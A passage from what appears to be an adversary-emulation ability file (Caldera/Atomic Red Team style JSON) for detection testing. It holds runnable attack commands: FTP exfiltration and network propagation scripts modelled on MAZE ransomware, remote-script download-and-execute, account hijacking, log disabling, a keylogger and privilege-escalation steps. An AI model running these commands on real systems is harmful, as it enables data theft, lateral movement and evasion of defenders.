"requirements": [], "name": "LogMeIn Files Detected Test on Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Emulates modification of syslog configuration.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["if [ -f \"/etc/syslog.conf\" ]; then sed -i '$ d' /etc/syslog.conf; fi; if [ -f \"/etc/rsyslog.conf\" ]; then sed -i '$ d' /etc/rsyslog.conf; fi; if [ -f \"/etc/syslog-ng/syslog-ng.conf\" ]; then sed -i '$ d' /etc/syslog-ng/syslog-ng.conf; fi"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -f \"/etc/syslog.conf\" ]; then sed -i '$ a #art_test_1562_006_2' /etc/syslog.conf; fi; if [ -f \"/etc/rsyslog.conf\" ]; then sed -i '$ a #art_test_1562_006_2' /etc/rsyslog.conf; fi; if [ -f \"/etc/syslog-ng/syslog-ng.conf\" ]; then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/syslog-ng.conf; fi", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Indicator Blocking", "ability_id": "0f9a074d436196d0796e2cb3ecb964e8", "technique_id": "T1562.006", "tactic": "defense-evasion", "requirements": [], "name": "Logging Configuration Changes on Linux Host", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable and can be configured to write the latest \"bash history\" entries to the syslog.\n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["unset PROMPT_COMMAND"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")'; echo \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\"; tail /var/log/syslog", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Input Capture: Keylogging", "ability_id": "3b705c3783af10560a0cdfa46c7bc78f", "technique_id": "T1056.001", "tactic": "multiple", "requirements": [], "name": "Logging bash history to syslog", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["chsh --shell /usr/sbin/nologin nobody; cat /etc/passwd |grep nobody"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cat /etc/passwd |grep nobody ; chsh --shell /bin/bash nobody; usermod --password $(openssl passwd -1 nobody) nobody; su nobody; whoami; exit", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Valid Accounts: Local Accounts", "ability_id": "575e90a4ba9a5eb7019c0238681c018a", "technique_id": "T1078.003", "tactic": "multiple", "requirements": [], "name": "Login as nobody (Linux)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test performs a Windows system logoff as seen in [dcrat backdoor capabilities](https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor)\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "shutdown /l", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Shutdown/Reboot", "ability_id": "17be2b5f2b1dd2d7dd2eb1a63aecdeee", "technique_id": "T1529", "tactic": "impact", "requirements": [], "name": "Logoff System - Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adds a registry value to run batch script created in the %temp% directory. Upon execution, there will be a new environment variable in the HKCU\\Environment key\nthat can be viewed in the Registry Editor.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["REG.exe DELETE HKCU\\Environment /v UserInitMprLogonScript /f >nul 2>&1 && del %temp%\\art.bat >nul 2>&1 && del \"%USERPROFILE%\\desktop\\T1037.001-log.txt\" >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "echo \"echo Art \"Logon Script\" atomic test was successful. >> %USERPROFILE%\\desktop\\T1037.001-log.txt\" > %temp%\\art.bat && REG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"%temp%\\art.bat\" /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Initialization Scripts: Logon Script (Windows)", "ability_id": "a50586369af237825fc9ccd500b80e5d", "technique_id": "T1037.001", "tactic": "multiple", "requirements": [], "name": "Logon Scripts", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes commands from a specially prepared ie4uinit.inf file.\nPoc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/\nReference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["cebed2_ieuinit.inf"], "parsers": [], "cleanup": ["del %TEMP%\\ie4uinit.exe >nul 2>&1 && del %TEMP%\\ieuinit.inf >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy c:\\windows\\system32\\ie4uinit.exe %TEMP%\\ie4uinit.exe && copy cebed2_ieuinit.inf %TEMP%\\ieuinit.inf && %TEMP%\\ie4uinit.exe -BaseSettings", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution", "ability_id": "6621c3d77cfc40676e5ff46af37ceb4e", "technique_id": "T1218", "tactic": "defense-evasion", "requirements": [], "name": "Lolbas ie4uinit.exe use as proxy", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copy UNC file to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %TEMP%\\redcanary.cab >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "del %TEMP%\\redcanary.cab >nul 2>&1 && C:\\Windows\\System32\\replace.exe \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\redcanary.cab %TEMP% /A", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "9b34fc9731b75debb71fc7a0101a03ad", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "Lolbas replace.exe use to copy UNC file", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copy file.cab to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["682a17_redcanary.cab"], "parsers": [], "cleanup": ["del %TEMP%\\redcanary.cab >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "del %TEMP%\\redcanary.cab >nul 2>&1 && C:\\Windows\\System32\\replace.exe 682a17_redcanary.cab %TEMP% /A", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "087b39642aeab378db9c474ce07e1b4e", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "Lolbas replace.exe use to copy file", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes logon scripts configured in Group Policy.\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Gpscript /logon", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution", "ability_id": "6c35402f56f69f6eaf8c0cbe36fa1638", "technique_id": "T1218", "tactic": "defense-evasion", "requirements": [], "name": "Lolbin Gpscript logon option", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes startup scripts configured in Group Policy\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Gpscript /startup", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution", "ability_id": "209d25131d45ef2d76e3bf69d200173f", "technique_id": "T1218", "tactic": "defense-evasion", "requirements": [], "name": "Lolbin Gpscript startup option", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use jsc.exe to compile javascript code stored in Library.js and output Library.dll.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["5bdafa_LibHello.js"], "parsers": [], "cleanup": ["del %TEMP%\\LibHello.js && del %TEMP%\\LibHello.dll"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy 5bdafa_LibHello.js %TEMP%\\LibHello.js && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe /t:library %TEMP%\\LibHello.js", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Trusted Developer Utilities Proxy Execution", "ability_id": "f68c7284a0d5faf3fc9dfa8c67db0586", "technique_id": "T1127", "tactic": "defense-evasion", "requirements": [], "name": "Lolbin Jsc.exe compile javascript to dll", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use jsc.exe to compile javascript code stored in scriptfile.js and output scriptfile.exe.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["a25c19_hello.js"], "parsers": [], "cleanup": ["del %TEMP%\\hello.js && del %TEMP%\\hello.exe"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy a25c19_hello.js %TEMP%\\hello.js && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe %TEMP%\\hello.js", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Trusted Developer Utilities Proxy Execution", "ability_id": "c7377e8d72e51f1d71f37f86357540c2", "technique_id": "T1127", "tactic": "defense-evasion", "requirements": [], "name": "Lolbin Jsc.exe compile javascript to exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.\nUpon successful execution, all 7z files within the %windir%\\temp directory will be uploaded to a remote FTP server. \nReference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$ftp = \"ftp://#{ftp_server}/\"; try {foreach ($file in (dir \"$env:windir\\temp\" \"*.7z\")); {$uri = New-Object System.Uri($ftp+$file.name);  $ftp_del = [System.Net.FtpWebRequest]::create($uri);  $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}');  $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile;  $ftp_del.GetResponse()}} catch{}"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$Dir_to_copy = \"$env:windir\\temp\"; $ftp = \"ftp://#{ftp_server}/\"; $web_client = New-Object System.Net.WebClient; $web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}'); if (test-connection -count 1 -computername \"#{ftp_server}\" -quiet); {foreach($file in (dir $Dir_to_copy \"*.7z\")); {echo \"Uploading $file...\"; $uri = New-Object System.Uri($ftp+$file.name); $web_client.UploadFile($uri, $file.FullName)}}; else; {echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol", "ability_id": "6646e3ecc1d5a25bc1cd7e68fe43763b", "technique_id": "T1048.003", "tactic": "exfiltration", "requirements": [], "name": "MAZE FTP Upload", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\\Temp directory of each one. \nUpon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.\nReference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html \n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["if (test-path \"$env:temp\\T1105CompletedHosts.txt\") ; {foreach ($machine in get-content -path \"$env:temp\\T1105CompletedHosts.txt\"); {wmic /node: \"$machine\" process where name='\"regsvr32.exe\"' call terminate | out-null; Remove-Item -path \"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe\" -force -erroraction silentlycontinue}}; Remove-Item -path \"$env:temp\\T1105OfflineHosts.txt\" -erroraction silentlycontinue; Remove-item -path \"$env:temp\\T1105CompletedHosts.txt\" -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$machine_list = \"$env:temp\\T1105MachineList.txt\"; $offline_list = \"$env:temp\\T1105OfflineHosts.txt\"; $completed_list = \"$env:temp\\T1105CompletedHosts.txt\"; foreach ($machine in get-content -path \"$machine_list\"); {if (test-connection -Count 1 -computername $machine -quiet) ; {cmd /c copy \"$env:comspec\" \"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe\"; echo $machine >> \"$completed_list\"; wmic /node: \"$machine\" process call create \"regsvr32.exe /i C:\\Windows\\Temp\\T1105.exe\"}; else; {echo $machine >> \"$offline_list\"}}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "b944f7b8548f3a3c8036f1b55324f881", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "MAZE Propagation Script", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the code in a project file using msbuild.exe. The default C# project example file (T1127.001.csproj) will simply print \"Hello From a Code Fragment\" and \"Hello From a Class.\" to the screen.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["e93bc3_T1127.001.csproj"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe e93bc3_T1127.001.csproj", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Trusted Developer Utilities Proxy Execution: MSBuild", "ability_id": "0fdc205a9f53455b1a14eb367a2d6ab7", "technique_id": "T1127.001", "tactic": "defense-evasion", "requirements": [], "name": "MSBuild Bypass Using Inline Tasks (C#)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the code in a project file using msbuild.exe. The default Visual Basic example file (vb.xml) will simply print \"Hello from a Visual Basic inline task!\" to the screen.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["f8ed8b_vb.xml"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe f8ed8b_vb.xml", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Trusted Developer Utilities Proxy Execution: MSBuild", "ability_id": "40c845837d06a51ff93c3449d6e00648", "technique_id": "T1127.001", "tactic": "defense-evasion", "requirements": [], "name": "MSBuild Bypass Using Inline Tasks (VB)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The Get-GPO cmdlet gets one Group Policy Object (GPO) or all the GPOs in a domain. Tested on Windows Server 2019 as a domain user with computer joined to domain. Reference: https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["del $env:temp\\GPO_Output.txt -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-GPO -Domain $ENV:userdnsdomain -All >> $env:temp\\GPO_Output.txt", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Group Policy Discovery", "ability_id": "5a1dc4ce41e376e1928d3a399ccadff3", "technique_id": "T1615", "tactic": "discovery", "requirements": [], "name": "MSFT Get-GPO Cmdlet", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the code specified within a XSL script tag during XSL transformation using a local payload. \nRequires download of MSXSL. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) \nOpen Calculator.exe when test successfully executed, while AV turned off.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["70a91b_msxslxmlfile.xml", "96ede8_msxslscript.xsl"], "parsers": [], "cleanup": ["del PathToAtomicsFolder\\T1220\\bin\\msxsl.exe >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "PathToAtomicsFolder\\T1220\\bin\\msxsl.exe 70a91b_msxslxmlfile.xml 96ede8_msxslscript.xsl", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "XSL Script Processing", "ability_id": "95828bbf041dab6f9743339122c4b7e1", "technique_id": "T1220", "tactic": "defense-evasion", "requirements": [], "name": "MSXSL Bypass using local files", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the code specified within a XSL script tag during XSL transformation using a remote payload.\nRequires download of MSXSL.exe. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )\nOpen Calculator.exe when test successfully executed, while AV turned off.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del -Path PathToAtomicsFolder\\T1220\\bin\\msxsl.exe >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "PathToAtomicsFolder\\T1220\\bin\\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "XSL Script Processing", "ability_id": "b1129d5b6d29f6611c03e4f091d6c42d", "technique_id": "T1220", "tactic": "defense-evasion", "requirements": [], "name": "MSXSL Bypass using remote files", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Hide a file on MacOS\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "xattr -lr * / 2>&1 /dev/null | grep -C 2 \"00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts: Hidden Files and Directories", "ability_id": "a148e685a0a83fb45ee1c4a722905e7c", "technique_id": "T1564.001", "tactic": "defense-evasion", "requirements": [], "name": "Mac Hidden file", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test uses the IOKit API to load a kernel module for macOS.\nHarcoded to use SoftRAID kext\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/T1547006_iokit_loader"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo /tmp/T1547006_iokit_loader; kextstat 2>/dev/null | grep SoftRAID; sudo kextunload /Library/Extensions/SoftRAID.kext", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions", "ability_id": "b9dd5e8853b5e83299c439c34f9b77de", "technique_id": "T1547.006", "tactic": "multiple", "requirements": [], "name": "MacOS - Load Kernel Module via KextManagerLoadKextWithURL()", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test uses the kextload and kmutil commands to load and unload a MacOS kernel module.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "set -x; sudo kextload /Library/Extensions/SoftRAID.kext; kextstat 2>/dev/null | grep SoftRAID; sudo kextunload /Library/Extensions/SoftRAID.kext; sudo kmutil load -p /Library/Extensions/SoftRAID.kext; kextstat 2>/dev/null | grep SoftRAID; sudo kmutil unload -p /Library/Extensions/SoftRAID.kext", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions", "ability_id": "87c08b408756abf34e1fa3403d01fde7", "technique_id": "T1547.006", "tactic": "multiple", "requirements": [], "name": "MacOS - Load Kernel Module via kextload and kmutil", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilizes a swift script to log keys to sout. It runs for 5 seconds then dumps the output to standard. Input Monitoring is required.\nInput Monitoring can be enabled in System Preferences > Security & Privacy > Privacy > Input Monitoring.\nReferece: https://cedowens.medium.com/taking-esf-for-a-nother-spin-6e1e6acd1b74\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["8495c4_MacOSKeylogger.swift"], "parsers": [], "cleanup": ["kill `pgrep swift-frontend`"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "swift 8495c4_MacOSKeylogger.swift -keylog", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Input Capture: Keylogging", "ability_id": "92a964d6a72ac5162788d5a81cf1311a", "technique_id": "T1056.001", "tactic": "multiple", "requirements": [], "name": "MacOS Swift Keylogger", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Make, change owner, and change file attributes on a C source code file\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo rm /tmp/hello; sudo rm /tmp/hello.c"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "cp; sudo chown root /tmp/hello.c; sudo make /tmp/hello; sudo chown root /tmp/hello; sudo chmod u+s /tmp/hello; /tmp/hello", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo rm /tmp/hello; sudo rm /tmp/hello.c"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cp; sudo chown root /tmp/hello.c; sudo make /tmp/hello; sudo chown root /tmp/hello; sudo chmod u+s /tmp/hello; /tmp/hello", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid", "ability_id": "7ecae3350a573cf886e1a51e21b2cbbd", "technique_id": "T1548.001", "tactic": "multiple", "requirements": [], "name": "Make and modify binary from C source", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Make and modify [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) of a C source code file.\nThe binary doesn't have to modify the UID, but the binary is given the capability to arbitrarily modify it at any time with `setuid(0)`.\nWithout being owned by root, the binary can set the UID to 0.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/cap; rm /tmp/cap.c"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cp; make /tmp/cap; sudo setcap cap_setuid=ep /tmp/cap; /tmp/cap", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid", "ability_id": "2e136b3814e4eb292c9234b5830833e1", "technique_id": "T1548.001", "tactic": "multiple", "requirements": [], "name": "Make and modify capabilities of a binary", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["echo \"Sorry you have to reboot\""], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "PathToAtomicsFolder\\T1562.002\\bin\\Phant0m.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable Windows Event Logging", "ability_id": "0962e6107fcfa0f5abe2c5880d31cf34", "technique_id": "T1562.002", "tactic": "defense-evasion", "requirements": [], "name": "Makes Eventlog blind with Phant0m", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "User Execution: Malicious File", "ability_id": "ab1b50880382b06d48d3d23ad1786239", "technique_id": "T1204.002", "tactic": "execution", "requirements": [], "name": "Maldoc choice flags command execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adversaries may rely on a user running a malicious image to facilitate execution", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["start-sleep -s 5; stop-process -Name \"Calculatorapp\" -Force ; dismount-diskimage -ImagePath \"$env:TEMP\\qbot-test.iso\""], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso\" -OutFile \"$env:TEMP\\qbot-test.iso\"); Mount-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\"; $mountedpath = (Get-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\" | Get-Volume).DriveLetter; $finalpath = $mountedpath + \":\\\"; cd $finalpath; .\\calc.exe.lnk", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "User Execution: Malicious Image", "ability_id": "b939c81cba750f4b3ef67e6b0456b41e", "technique_id": "T1204.003", "tactic": "execution", "requirements": [], "name": "Malicious Execution from Mounted ISO Image", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a PAM module, inserts a rule to use it, and then tests it.\n\nUpon successful execution, this test will create a 